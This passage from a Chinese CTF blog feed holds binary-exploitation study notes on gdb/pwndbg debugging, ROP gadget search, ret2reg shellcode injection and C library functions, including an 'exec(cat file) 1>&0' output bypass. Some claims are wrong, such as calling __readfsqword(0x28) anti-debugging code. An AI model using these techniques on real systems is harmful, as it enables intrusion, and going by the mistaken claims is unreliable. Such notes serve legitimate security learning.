<code>栈帧的底部</code> 。</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1OTcyNzE0ODYvYXJ0aWNsZS9kZXRhaWxzLzgwNDI1MDg5\">https://blog.csdn.net/yu97271486/article/details/80425089</span></p>\n<h3 id=\"48查看输入的数据与ebp的偏移\"><a class=\"anchor\" href=\"#48查看输入的数据与ebp的偏移\">#</a> 48. 查看输入的数据与 ebp 的偏移</h3>\n<p>在要知道与 ebp 的偏移，就需要进行动态调试【动态调试要 <code>start</code>  进入输入完后直接查看栈，不然利用 <code>r</code>  输入完后查看会被改变】：</p>\n<p>首先查看 buf 的地址 (一步一步进入到 read 处)：</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/%E5%9B%BE%E5%BA%8A/C%5BGMWAP38%7BTD95DRA39HYWR.png\" alt=\"\" /></p>\n<p>输入 <code>aaaa</code>  查看栈：</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/%E5%9B%BE%E5%BA%8A/%5DX4FU%25E%7B7F6I%7E%7BNMU7%293H%5BF.png\" alt=\"\" /></p>\n<p>对于这里 ebp <code>0xffffd008</code>  是当前函数的 ebp，框里的是 main 的 ebp，要通过 main 的 ebp 函数来计算（因为泄露的是 main 函数的 ebp 地址）</p>\n<p>最后偏移：</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/%E5%9B%BE%E5%BA%8A/FQE7DIW9%245SZ1M149O8%40%60%7DE.png\" alt=\"\" /></p>\n<h3 id=\"49python进行base64加密pwn76\"><a class=\"anchor\" href=\"#49python进行base64加密pwn76\">#</a> 49.python 进行 base64 加密（pwn76）</h3>\n<p>base64 要加入库 <code>import base64</code> ，然后加密为  <code>base64.b64encode(payload)</code></p>\n<h3 id=\"50多线程\"><a class=\"anchor\" href=\"#50多线程\">#</a> 50. 多线程</h3>\n<p>Arena</p>\n<p>一个线程申请的 1 个或多个堆包含很多的信息：二进制位信息，多个 malloc_chunk 信息等这些堆需要东西来进行管理，那么 Arena 就是来管理线程中的这些堆的，也可以理解为堆管理器所持有的内存池。</p>\n<p>操作系统 --&gt; 堆管理器 --&gt; 用户</p>\n<p>物理内存 --&gt; arena -&gt; 可用内存</p>\n<p>堆管理器与用户的内存交易发生于 arena 中，可以理解为堆管理器向操作系统批发来的有冗余的内存库存。</p>\n<p>一个线程只有一个 arnea，并且这些线程的 arnea 都是独立的不是相同的</p>\n<p>主线程的 arnea 称为 “main_arena”。子线程的 arnea 称为 “thread_arena”。</p>\n<p>主线程无论一开始 malloc 多少空间，只要 size&lt;128KB，kernel 都会给 132KB 的 heap segment (rw)。这部分称为 main arena。 main_arena 并不在申请的 heap 中，而是一个全局变量，在 <span class=\"exturl\" data-url=\"aHR0cDovL2xpYmMuc28=\">libc.so</span> 的数据段。</p>\n<p><img data-src=\"https://wiki.wgpsec.org/images/heap/3.png\" alt=\"\" /></p>\n<p><img data-src=\"https://wiki.wgpsec.org/images/heap/4.png\" alt=\"\" /></p>\n<p>获取，直到空间不足。当 arena 空间不足时，它可以通过增加 brk 的方式来增加堆的空间。类似地，arena 也可以通过减小 brk 来缩小自己的空间。</p>\n<p>即使将所有 main arena 所分配出去的内存块 free 完，也不会立即还给 kernel，而是交由 glibc 来管理。当后面程序再次申请内存时，在 glibc 中管理的内存充足的情况下，glibc 就会根据堆分配的算法来给程序分配相应的内存</p>\n<p>多线程</p>\n<p>在原来的 dlmalloc 实现中，当两个线程同时要申请内存时，只有一个线程可以进入临界区申请内存，而另外一个线程则必须等待直到临界区中不再有线程。这是因为所有的线程共享一个堆。在 glibc 的 ptmalloc 实现中，比较好的一点就是支持了多线程的快速访问。在新的实现中，所有的线程共享多个堆</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93aWtpLndncHNlYy5vcmcva25vd2xlZGdlL2N0Zi9iYXNpY2hlYXAuaHRtbA==\">https://wiki.wgpsec.org/knowledge/ctf/basicheap.html</span></p>\n<h3 id=\"51pwndbg-rebase功能\"><a class=\"anchor\" href=\"#51pwndbg-rebase功能\">#</a> 51.pwndbg rebase 功能</h3>\n<p><code>pwndbg rebase</code>  功能<br />\n具体用法如下:</p>\n<p><code>b *$rebase(offset)</code> <br />\n 非常方便！！在你运行开启了 pie 和 aslr 的程序时，不需要你自己计算偏移下断点</p>\n<p>在 pwntools 下可以这么用:</p>\n<p><code>gdb.attach(io,&quot;b *$rebase(0x27C3)&quot;)</code></p>\n<h3 id=\"52多线程调试\"><a class=\"anchor\" href=\"#52多线程调试\">#</a> 52. 多线程调试：</h3>\n<p>在有多线程的程序，我们查看堆这种默认显示的是主线程，我们需要查看子线程时：</p>\n<p>命令 (pwndbg 内)：</p>\n<ul>\n<li><code>info threads</code>  查看当前所有的线程</li>\n<li><code>thread n</code> : 切换到 id 为 n 的线程中</li>\n</ul>\n<p>对于进程也有类似的命令 <code>info inferiors/inferior n</code> ，在调试多进程交互的程序时会经常用到。</p>\n<p>常用的命令：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ldmlscGFuLmNvbS8yMDIwLzA5LzEzL2dkYi10aXBzLw==\">https://evilpan.com/2020/09/13/gdb-tips/</span></p>\n<h3 id=\"53ropgadget-binary-pwn79-only-jmpcall\"><a class=\"anchor\" href=\"#53ropgadget-binary-pwn79-only-jmpcall\">#</a> 53. <code>ROPgadget --binary pwn79  --only &quot;jmp|call&quot;</code></h3>\n<p>利用这个可以帮助我们在用 <code>ret2reg</code>  时跳转到保存目标地址的寄存器</p>\n<ul>\n<li>** 查找关键字构造 ROP 链 ：**ROPgadget --binary pwn40  |grep &quot;pop rdi&quot;</li>\n</ul>\n<h3 id=\"54ret2regpwn79\"><a class=\"anchor\" href=\"#54ret2regpwn79\">#</a> 54.ret2reg（pwn79）</h3>\n<p>ret2reg 原理：</p>\n<ol>\n<li>查看溢出函返回时哪个寄存值指向 <code>执行目标</code> 的地址空间</li>\n<li>查找 call reg 或者 jmp reg 指令（reg 代指某个寄存器），将 EIP 设置为该指令地址（该命令覆盖 ret 位置）</li>\n<li>reg 所指向的空间上注入 Shellcode (需要确保该空间是可以执行的，但通常都是栈上的)</li>\n</ol>\n<h3 id=\"5532位和64位寄存器\"><a class=\"anchor\" href=\"#5532位和64位寄存器\">#</a> 55.32 位和 64 位寄存器</h3>\n<h4 id=\"32位\"><a class=\"anchor\" href=\"#32位\">#</a> 32 位：</h4>\n<blockquote>\n<p>4 个数据（通用）寄存器：(eax、ebx、ecx、edx)</p>\n<p>6 个段寄存器：（ES、CS、SS、DS、FS、GS）</p>\n<p>2 个变址寄存器：（ESI、EDI）</p>\n<p>2 个指针寄存器（ESP、EBP） <strong>ebp 为基指针寄存器，用它可直接存取堆栈中的数据。esp 为堆栈指针寄存器，用它只可访问栈顶。</strong></p>\n<p>1 个指令指针寄存器：EIP</p>\n</blockquote>\n<h4 id=\"64位\"><a class=\"anchor\" href=\"#64位\">#</a> 64 位：</h4>\n<p>X86-64 有 16 个 64 位寄存器，分别是：% rax，% rbx，% rcx，% rdx，% esi，% edi，% rbp，% rsp，% r8，% r9，% r10，% r11，% r12，% r13，% r14，% r15。</p>\n<blockquote>\n<p>% rax 作为函数返回值使用。</p>\n<p>% rsp 栈指针寄存器，指向栈顶</p>\n<p>% rdi，% rsi，% rdx，% rcx，% r8，% r9 用作函数参数，依次对应第 1 参数，第 2 参数</p>\n<p>% rbx，% rbp，% r12，% r13，% r14，% r15 用作数据存储，调用子函数之前要备份它，以防被修改</p>\n<p>% r10，% r11 数据存储，使用之前要先保存原值</p>\n</blockquote>\n<h3 id=\"56gdb的cyclic命令\"><a class=\"anchor\" href=\"#56gdb的cyclic命令\">#</a> 56.gdb 的 cyclic 命令</h3>\n<p>gdb 中可以通过 cyclic 构造有规律的字符串，如  <code>cyclic 200</code></p>\n<p>然后输入程序当中出现返回地址错误后，可以计算输入值与 ret 的偏移量： <code>cyclic -l invalid address</code></p>\n<p>比如下面到 ret 的偏移量已经是 112（<strong>已经包含了 ebp 的 4 字节</strong>）：</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/img/image-20250112214713548.png\" alt=\"image-20250112214713548\" /></p>\n<h3 id=\"57python的format用法\"><a class=\"anchor\" href=\"#57python的format用法\">#</a> 57.python 的 format 用法</h3>\n<p>利用 format () 内的内容，替换前面的 <code>&#123;&#125;</code>  中的或把 <code>:</code>  后的内容赋值给相应的变量名，<strong>替换后的不带 <code>&#123;&#125;</code> </strong></p>\n<p><strong>format 用法：</strong></p>\n<p>(1) 不带编号，即 “{}”</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'&#123;&#125; &#123;&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token string\">'hello'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'world'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\">#按顺序替换</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>hello world</pre></td></tr></table></figure><p>(2) 带数字编号，可调换顺序，即 “{0}”、“{1}”</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'&#123;0&#125; &#123;1&#125; &#123;0&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token string\">'hello'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'world'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\">#编号从 0 开始</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>hello world hello</pre></td></tr></table></figure><p>(3) 带关键字，即 “{a}”、“{tom}”</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'&#123;a&#125; &#123;tom&#125; &#123;a&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>tom<span class=\"token operator\">=</span><span class=\"token string\">'hello'</span><span class=\"token punctuation\">,</span>a<span class=\"token operator\">=</span><span class=\"token string\">'world'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\">#对变量进行赋值</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>world hello world</pre></td></tr></table></figure><p>(4) 通过映射 list,dict</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>a_list <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'chuhao'</span><span class=\"token punctuation\">,</span><span class=\"token number\">20</span><span class=\"token punctuation\">,</span><span class=\"token string\">'china'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">print</span> <span class=\"token string\">'my name is &#123;0[0]&#125;,from &#123;0[2]&#125;,age is &#123;0[1]&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>a_list<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">#my name is chuhao,from china,age is 20</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>b_dict <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token string\">'name'</span><span class=\"token punctuation\">:</span><span class=\"token string\">'chuhao'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'age'</span><span class=\"token punctuation\">:</span><span class=\"token number\">20</span><span class=\"token punctuation\">,</span><span class=\"token string\">'province'</span><span class=\"token punctuation\">:</span><span class=\"token string\">'shanxi'</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">print</span> <span class=\"token string\">'my name is &#123;name&#125;, age is &#123;age&#125;,from &#123;province&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token operator\">**</span>b_dict<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#my name is chuhao, age is 20,from shanxi</span></pre></td></tr></table></figure><p>(5) 数字格式化</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">print</span> <span class=\"token string\">'&#123;:b&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token number\">18</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#二进制 10010</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">print</span> <span class=\"token string\">'&#123;:d&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token number\">18</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#十进制 18</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">print</span> <span class=\"token string\">'&#123;:o&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token number\">18</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#八进制 22</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">print</span> <span class=\"token string\">'&#123;:x&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token number\">18</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#十六进制 12</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">print</span> <span class=\"token string\">'&#123;:.2f&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token number\">321.33345</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#321.33</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token number\">12345</span></pre></td></tr></table></figure><p>(6) 填充与对齐</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">print</span> <span class=\"token string\">'&#123;:>8&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token string\">'189'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">#     189</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">print</span> <span class=\"token string\">'&#123;:0>8&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token string\">'189'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">#00000189</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">print</span> <span class=\"token string\">'&#123;:a>8&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token string\">'189'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#aaaaa189</span></pre></td></tr></table></figure><h3 id=\"58gdb查看函数\"><a class=\"anchor\" href=\"#58gdb查看函数\">#</a> 58.gdb 查看函数</h3>\n<p>disass 函数名</p>\n",
            "tags": [
                "pwn",
                "二进制"
            ]
        },
        {
            "id": "https://vvwwvv.cn/2023/08/24/pwn/c%E5%87%BD%E6%95%B0%E5%8F%8A%E6%BC%8F%E6%B4%9E/",
            "url": "https://vvwwvv.cn/2023/08/24/pwn/c%E5%87%BD%E6%95%B0%E5%8F%8A%E6%BC%8F%E6%B4%9E/",
            "title": "C语言函数（及漏洞利用）",
            "date_published": "2023-08-24T11:23:15.000Z",
            "content_html": "<p>这里用来记录在 pwn 题中一些 C 语言函数的作用和一些函数的漏洞</p>\n<h1 id=\"1-atol-atoi-atoq\"><a class=\"anchor\" href=\"#1-atol-atoi-atoq\">#</a> 1. atol、 atoi、atoq</h1>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">atoi</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>nptr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">long</span> <span class=\"token function\">atol</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>nptr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">long</span> <span class=\"token keyword\">long</span> <span class=\"token function\">atoll</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>nptr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">long</span> <span class=\"token keyword\">long</span> <span class=\"token function\">atoq</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>nptr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><pre><code>atoi:  把字符串nptr转换为int\natol:  把字符串nptr转换为 long int/long long int\natoq:  \n</code></pre>\n<h1 id=\"2__readfsqword0x28u\"><a class=\"anchor\" href=\"#2__readfsqword0x28u\">#</a> 2.__readfsqword(0x28u)</h1>\n<p><strong>这段代码是通常用于 alarm 函数，防止调试</strong></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> <span class=\"token function\">__readfsbyte</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>   <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> Offset</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> <span class=\"token function\">__readfsword</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>   <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> Offset</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> <span class=\"token function\">__readfsdword</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>   <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> Offset</pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">unsigned</span> __int64 <span class=\"token function\">__readfsqword</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>   <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> Offset</pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>Offset:<br />\n[in] 从 FS 的开头开始读取的偏移量。</p>\n<p>返回值：位置 FS:[Offset] 处的字节、字、双字或四字（由调用的函数名称指示）的内存内容。</p>\n<h1 id=\"3fopenarg1agr2\"><a class=\"anchor\" href=\"#3fopenarg1agr2\">#</a> 3.fopen(&quot;arg1&quot;,&quot;agr2&quot;)</h1>\n<p>该函数原型：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>FILE <span class=\"token operator\">*</span><span class=\"token function\">fopen</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>filename<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>mode<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">//filename-- 这是 C 字符串，包含了要打开的文件名称。</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">//mode-- 这是 C 字符串，包含了文件访问模式。</span></pre></td></tr></table></figure><p>功能：使用给定的模式 mode 打开 filename 所指向的文件。</p>\n<p>返回值：文件顺利打开后，指向该流的文件指针就会被返回。如果文件打开失败则返回 NULL，并把错误代码存在 error 中。</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/17/pPhGVIA.png\" alt=\"\" /></p>\n<h1 id=\"4freadbuffersizecountstream\"><a class=\"anchor\" href=\"#4freadbuffersizecountstream\">#</a> 4.fread(buffer,size,count,stream)</h1>\n<p>功能：从给定输入流 stream 读取最多 count 个对象到数组 buffer 中（相当于以对每个对象调用 size 次 fgetc），把 buffer 当作 unsigned char 数组并顺序保存结果。流的文件位置指示器前进读取的字节数。</p>\n<p>返回值：</p>\n<pre><code>返回成功读取的对象个数，若出现错误或到达文件末尾，则可能小于count。\n\n若size或count为零，则fread返回零且不进行其他动作。\n\nfread不区分文件尾和错误，因此调用者必须用feof和ferror才能判断发生了什么。\n示例\n</code></pre>\n<ul>\n<li>buffer : 指向要读取的数组中首个对象的指针</li>\n<li>size : 每个对象的大小（单位是字节）</li>\n<li>count : 要读取的对象个数</li>\n<li>stream ：输入流</li>\n</ul>\n<h1 id=\"5-int-sprintfchar-string-char-format-argument\"><a class=\"anchor\" href=\"#5-int-sprintfchar-string-char-format-argument\">#</a> 5. int sprintf(char *string, char *format [,argument,...]);</h1>\n<p><code>将结果打印到字符串中，而printf是直接在命令行上输出</code></p>\n<ul>\n<li>string-- 这是指向一个字符数组的指针，该数组存储了 C 字符串。</li>\n<li>format--format-- 这是字符串，包含了要 <code>被写入到 string 的文本</code> 。它可以包含嵌入的 format 标签，format 标签可被随后的附加参数中指定的值替换，并按需求进行格式化。</li>\n<li>[argument]...：根据不同的 format 字符串，函数可能需要一系列的附加参数，每个参数包含了一个要被插入的值，替换了 format 参数中指定的每个 % 标签。参数的个数应与 % 标签的个数相同。</li>\n</ul>\n<p>返回值：</p>\n<p>如果成功，则返回写入的字符总数，不包括字符串追加在字符串末尾的空字符。如果失败，则返回一个负数。</p>\n<p>sprintf 返回以 format 为格式 argument 为内容组成的结果被写入 string 的字节数，结束字符‘\\0’不计入内。即，如果 “Hello” 被写入空间足够大的 string 后，函数 sprintf 返回 5。</p>\n<pre><code>转换字符\n%% 印出百分比符号，不转换。\n%c 字符输出到缓冲区，不转换。\n%d 整数转成十进位。\n%f 倍精确度数字转成浮点数。\n%o 整数转成八进位。\n%s 字符串输出到缓冲区，不转换。\n%x 整数转成小写十六进位。\n%X 整数转成大写十六进位。\n</code></pre>\n<h1 id=\"6memchrconst-void-buf-int-ch-size_t-count\"><a class=\"anchor\" href=\"#6memchrconst-void-buf-int-ch-size_t-count\">#</a> 6.memchr(const void *buf, int ch, size_t count)</h1>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">extern</span> <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token function\">memchr</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>buf    <span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> ch    <span class=\"token punctuation\">,</span>  <span class=\"token class-name\">size_t</span> count<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>功能：从 buf 所指内存区域的前 count 个字节查找字符 ch。</p>\n<p>说明：当第一次遇到字符 ch 时停止查找。如果成功，返回指向字符 ch 的指针；否则返回 NULL。</p>\n<h1 id=\"7memcpyvoid-destin-void-source-unsigned-n\"><a class=\"anchor\" href=\"#7memcpyvoid-destin-void-source-unsigned-n\">#</a> 7.memcpy(void *destin, void *source, unsigned n)</h1>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token function\">memcpy</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>destin<span class=\"token punctuation\">,</span>   <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>source<span class=\"token punctuation\">,</span>    <span class=\"token keyword\">unsigned</span> n<span class=\"token punctuation\">)</span>；</pre></td></tr></table></figure><p>功能：从源 source 所指的内存地址的起始位置开始拷贝 n 个字节到目标 destin 所指的内存地址的起始位置中</p>\n<p>返回值：该函数返回一个指向目标存储区 destin 的指针。</p>\n<ul>\n<li>destin-- 指向用于存储复制内容的目标数组，类型强制转换为 void* 指针。</li>\n<li>source-- 指向要复制的数据源，类型强制转换为 void* 指针。</li>\n<li>n-- 要被复制的字节数。</li>\n</ul>\n<h1 id=\"8char-strcat-char-destination-const-char-source\"><a class=\"anchor\" href=\"#8char-strcat-char-destination-const-char-source\">#</a> 8.char * strcat ( char * destination, const char * source );</h1>\n<p>功能：strcat 的实现模式是将 src 中的所有字符（连同字符串最后的’\\0’一起）加到 dest 字符串中第一个‘\\0’的位置，具体一点说就是将 dest 中第一个’\\0’替换成 src 的第一个字符，然后该’\\0’后的字符替换成 src 的第二个字符，后面以此类推。【把 src 所指向的字符串追加到 dest 所指向的字符串的结尾】</p>\n<p>返回值：该函数返回一个指向最终的目标字符串 dest 的指针。</p>\n<h1 id=\"9fork\"><a class=\"anchor\" href=\"#9fork\">#</a> 9.fork（）</h1>\n<p>fork 被调用一次会返回两次（后面的语句也就判断 2 次），返回 0 代表其是子进程，而在父进程中接到的返回值是子进程的 pid，fork 为负值代表出现错误</p>\n<p>调用 fork 会产生一个子进程，子进程会复制父进程的当前状态，这时两个进程便会开始同时运行，且执行顺序不一定</p>\n<pre><code>子进程的fork（）返回值为0 #第一次返回（不分先后，第一次返回也可能是父进程的fork）\n父进程的fork（）返回值为子进程的pid  #第二次返回\n</code></pre>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2N1aXQyMDE2MTIzMDcwL2FydGljbGUvZGV0YWlscy84MzI4MDEyNQ==\">https://blog.csdn.net/cuit2016123070/article/details/83280125</span></p>\n<h1 id=\"10int-fclose-file-fp-可以利用linux命令重定向标准输入输出控制\"><a class=\"anchor\" href=\"#10int-fclose-file-fp-可以利用linux命令重定向标准输入输出控制\">#</a> 10.int fclose (FILE *fp); 【可以利用 Linux 命令重定向标准输入输出控制】</h1>\n<p>功能：关闭文件输出流（使用 fclose () 函数就可以把 缓冲区内最后剩余的数据输出到内核缓冲区，并释放 文件指针和有关的缓冲区。 ）</p>\n<p>返回值：如果流成功关闭，fclose 返回 0，否则返回 EOF（-1）【关闭成功返回 1】。（如果流为 NULL，而且程序可以继续执行，fclose 设定 error number 给 EINVAL，并返回 EOF。）</p>\n<p>绕过方式：Linux 的  <code>exec（cat [文件名]） 1&gt;&amp;0</code>  ，在 Linux 系统中文件描述符 <code>1为标准输出流，0为标准输入流，2为标准错误（输出到屏幕）</code> ，而通过 <code>&amp;+文件描述符</code> 的方式可以代替文件名，（这里就指向了该终端，所以结果显示在终端上 <code>因为默认打开一个终端后，0，1，2都指向该终端</code> ）</p>\n<h1 id=\"11strtol\"><a class=\"anchor\" href=\"#11strtol\">#</a> 11.strtol()</h1>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">long</span> <span class=\"token keyword\">int</span> <span class=\"token function\">strtol</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>str<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>endptr<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> base<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>作用：将参数 str 所指向的字符串根据给定的 base 转换成一个长整型数（long int 型），base 必须介于 2 和 36 之间（包含），或者是特殊值 0</p>\n<ul>\n<li>str  将要转换成长整型的字符串</li>\n<li>endptr  对类型 char * 的引用（引用 str），其值设置为在 str 中 <code>数值型字符串</code> 的下一个字符（如 123ab，则设置为 ab），用来判断是否转化成功</li>\n<li>base 基数，如果为 0 则会根据字符串的前缀来进行判断进制；如果字符串以 